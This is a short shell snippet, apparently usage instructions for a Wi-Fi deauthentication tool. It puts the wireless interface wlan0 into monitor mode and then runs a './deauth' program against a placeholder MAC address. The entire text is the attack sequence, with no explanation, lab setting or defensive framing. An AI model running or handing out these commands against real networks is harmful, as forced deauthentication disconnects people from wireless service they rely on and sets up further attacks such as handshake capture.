sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up

sudo ./deauth wlan0 aa:aa:aa:aa:aa:aa
